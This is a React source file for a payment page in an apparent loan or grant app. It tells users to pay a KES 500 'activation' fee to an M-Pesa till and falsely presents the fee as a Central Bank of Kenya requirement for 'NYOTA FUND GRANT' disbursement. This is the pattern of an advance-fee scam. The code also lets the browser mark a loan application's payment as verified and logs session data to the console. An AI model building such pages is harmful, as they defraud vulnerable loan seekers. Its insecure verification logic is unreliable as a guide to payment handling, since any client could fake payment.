import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useAuth } from '@/hooks/useAuth';
import { supabase } from '@/integrations/supabase/client';
import { Navbar } from '@/components/layout/Navbar';
import { Footer } from '@/components/layout/Footer';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useToast } from '@/hooks/use-toast';
import { Copy, CheckCircle, Loader2, Phone } from 'lucide-react';

export default function Payment() {
  const { user, loading } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();
  const { toast } = useToast();
  
  const [phoneNumber, setPhoneNumber] = useState('');
  const [processing, setProcessing] = useState(false);
  const [paymentSuccess, setPaymentSuccess] = useState(false);
  const [copied, setCopied] = useState(false);

  const loanApplicationId = location.state?.loanApplicationId;
  const activationFee = 500;

  useEffect(() => {
    if (!loading && !user) {
      navigate('/auth');
    }
  }, [user, loading, navigate]);

  useEffect(() => {
    if (user) {
      fetchUserPhone();
    }
  }, [user]);

  const fetchUserPhone = async () => {
    const { data } = await supabase
      .from('profiles')
      .select('phone_number')
      .eq('user_id', user!.id)
      .maybeSingle();
    
    if (data?.phone_number) {
      setPhoneNumber(data.phone_number);
    }
  };

  const copyTillNumber = () => {
    navigator.clipboard.writeText('8326404');
    setCopied(true);
    toast({
      title: 'Copied!',
      description: 'Till number copied to clipboard.',
    });
    setTimeout(() => setCopied(false), 2000);
  };

  const initiateSTKPush = async () => {
    if (!phoneNumber) {
      toast({
        title: 'Phone Required',
        description: 'Please enter your M-Pesa phone number.',
        variant: 'destructive',
      });
      return;
    }

    // Check if user is authenticated
    if (!user) {
      toast({
        title: 'Authentication Required',
        description: 'Please log in to continue with payment.',
        variant: 'destructive',
      });
      navigate('/auth');
      return;
    }

    // Format phone number to 254XXXXXXXXX
    let formattedPhone = phoneNumber.replace(/\s/g, '');
    if (formattedPhone.startsWith('0')) {
      formattedPhone = '254' + formattedPhone.substring(1);
    } else if (formattedPhone.startsWith('+254')) {
      formattedPhone = formattedPhone.substring(1);
    } else if (!formattedPhone.startsWith('254')) {
      formattedPhone = '254' + formattedPhone;
    }

    setProcessing(true);

    console.log('Initiating STK push with user:', user.id);
    console.log('Session check:', await supabase.auth.getSession());

    try {
      const { data, error } = await supabase.functions.invoke('payhero-stk-push', {
        body: {
          amount: activationFee,
          phone_number: formattedPhone,
          loan_application_id: loanApplicationId,
          user_id: user!.id,
        },
      });

      if (error) throw error;

      if (data.success) {
        toast({
          title: 'STK Push Sent!',
          description: 'Please check your phone and enter your M-Pesa PIN to complete payment.',
        });

        // Poll for payment status
        pollPaymentStatus(data.external_reference);
      } else {
        throw new Error(data.message || 'Failed to initiate payment');
      }
    } catch (error: any) {
      console.error('Payment error:', error);
      toast({
        title: 'Payment Failed',
        description: error.message || 'Failed to initiate payment. Please try again.',
        variant: 'destructive',
      });
      setProcessing(false);
    }
  };

  const pollPaymentStatus = async (externalReference: string) => {
    let attempts = 0;
    const maxAttempts = 30; // 1 minute timeout (2 second intervals)

    const checkStatus = async () => {
      attempts++;
      
      const { data, error } = await supabase
        .from('payments')
        .select('status')
        .eq('external_reference', externalReference)
        .maybeSingle();

      if (data?.status === 'completed') {
        setPaymentSuccess(true);
        setProcessing(false);
        
        // Update loan application payment status
        if (loanApplicationId) {
          await supabase
            .from('loan_applications')
            .update({ payment_verified: true })
            .eq('id', loanApplicationId);
        }

        toast({
          title: 'Payment Successful!',
          description: 'Your account has been activated.',
        });
        return;
      }

      if (data?.status === 'failed') {
        setProcessing(false);
        toast({
          title: 'Payment Failed',
          description: 'The payment was not completed. Please try again.',
          variant: 'destructive',
        });
        return;
      }

      if (attempts < maxAttempts) {
        setTimeout(checkStatus, 2000);
      } else {
        setProcessing(false);
        toast({
          title: 'Payment Timeout',
          description: 'Payment verification timed out. Please check your M-Pesa and try again if needed.',
          variant: 'destructive',
        });
      }
    };

    setTimeout(checkStatus, 3000);
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
      </div>
    );
  }

  if (paymentSuccess) {
    return (
      <div className="min-h-screen flex flex-col">
        <Navbar />
        <main className="flex-1 bg-muted/30 py-8 flex items-center justify-center">
          <Card className="max-w-md mx-auto text-center">
            <CardContent className="pt-8">
              <div className="w-20 h-20 bg-success/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <CheckCircle className="h-10 w-10 text-success" />
              </div>
              <h2 className="text-2xl font-bold text-success mb-4">Payment Verified Successfully!</h2>
              <p className="text-muted-foreground mb-6">
                Your account savings fee payment has been verified. Your loan application is now complete and under review.
              </p>
              <p className="text-sm text-muted-foreground mb-6">
                We will contact you within 24 hours with the loan decision.
              </p>
              <Button onClick={() => navigate('/dashboard')}>
                Return to Dashboard
              </Button>
            </CardContent>
          </Card>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />
      <main className="flex-1 bg-muted/30 py-8">
        <div className="container mx-auto px-4">
          <Card className="max-w-lg mx-auto">
            <CardHeader>
              <CardTitle className="text-2xl text-primary text-center">Your Account Savings Payment</CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="bg-muted/50 p-4 rounded-lg">
                <h3 className="font-semibold mb-3">Payment Instructions</h3>
                <p className="text-sm text-muted-foreground mb-4">
                  Activate NYOTA FUND GRANT application, the Central Bank of Kenya (CBK) requires you to deposit the amount below to activate your account for prompt and uninterrupted grant disbursement via M-Pesa (Regulated by CBK).
                </p>
                <ol className="text-sm space-y-1 list-decimal list-inside text-muted-foreground">
                  <li>Go to M-Pesa on your phone</li>
                  <li>Select "Lipa Na M-Pesa"</li>
                  <li>Select "Buy Goods and Services"</li>
                  <li>Enter Till Number: <strong>8326404</strong></li>
                  <li>Enter Amount: <strong>KES 500</strong></li>
                  <li>Enter your M-Pesa PIN and confirm</li>
                  <li>Wait for confirmation message</li>
                </ol>
              </div>

              <div className="bg-card border p-4 rounded-lg">
                <h3 className="font-semibold mb-3">Payment Details</h3>
                <p className="text-sm text-muted-foreground mb-2">
                  Business Name: <strong>SPARK INNOVATION VENTURES</strong>
                </p>
                
                <div className="flex items-center justify-between bg-muted/50 p-3 rounded-lg mb-3">
                  <span className="text-2xl font-bold">8326404</span>
                  <Button variant="outline" size="sm" onClick={copyTillNumber}>
                    {copied ? <CheckCircle className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                    <span className="ml-2">{copied ? 'Copied!' : 'Copy Till Number'}</span>
                  </Button>
                </div>

                <div className="text-center">
                  <p className="text-3xl font-bold text-primary">KES {activationFee}</p>
                </div>
              </div>

              <div className="border-t pt-6">
                <h3 className="font-semibold mb-4 flex items-center gap-2">
                  <Phone className="h-5 w-5 text-primary" />
                  Pay with M-Pesa STK Push
                </h3>
                <p className="text-sm text-muted-foreground mb-4">
                  Enter your M-Pesa phone number to receive a payment prompt directly on your phone.
                </p>
                
                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="phone">M-Pesa Phone Number</Label>
                    <Input
                      id="phone"
                      value={phoneNumber}
                      onChange={(e) => setPhoneNumber(e.target.value)}
                      placeholder="e.g. 0712345678"
                    />
                  </div>

                  <Button 
                    onClick={initiateSTKPush} 
                    className="w-full" 
                    disabled={processing}
                  >
                    {processing ? (
                      <>
                        <Loader2 className="h-4 w-4 animate-spin mr-2" />
                        Processing Payment...
                      </>
                    ) : (
                      'Pay KES 500 via M-Pesa'
                    )}
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>
      <Footer />
    </div>
  );
}
